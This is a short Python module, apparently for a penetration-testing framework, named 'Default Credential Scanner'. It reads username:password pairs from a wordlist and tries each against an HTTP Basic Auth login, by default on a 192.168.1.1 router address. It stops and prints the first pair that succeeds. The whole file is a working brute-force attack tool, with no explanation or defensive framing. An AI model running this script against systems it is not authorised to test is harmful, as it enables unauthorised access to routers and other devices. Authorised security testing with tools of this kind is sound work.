import requests
from requests.auth import HTTPBasicAuth

class Exploit:
    name = "Default Credential Scanner"
    description = "Tries common default credentials on an HTTP Basic Auth login"
    options = {
        "RHOST": "http://192.168.1.1",
        "WORDLIST": "default_creds.txt"
    }

    def run(self):
        url = self.options["RHOST"]
        wordlist = self.options["WORDLIST"]

        try:
            with open(wordlist, "r") as f:
                creds = [line.strip().split(":") for line in f if ":" in line]
        except FileNotFoundError:
            print(f"[!] Wordlist not found: {wordlist}")
            return

        print(f"[*] Scanning {url} with {len(creds)} credential pairs...")

        for user, pwd in creds:
            try:
                response = requests.get(url, auth=HTTPBasicAuth(user, pwd), timeout=3)
                if response.status_code == 200:
                    print(f"[+] SUCCESS: {user}:{pwd}")
                    return
                else:
                    print(f"[-] {user}:{pwd} failed (HTTP {response.status_code})")
            except Exception as e:
                print(f"[!] Error with {user}:{pwd} → {e}")

        print("[!] No valid credentials found.")
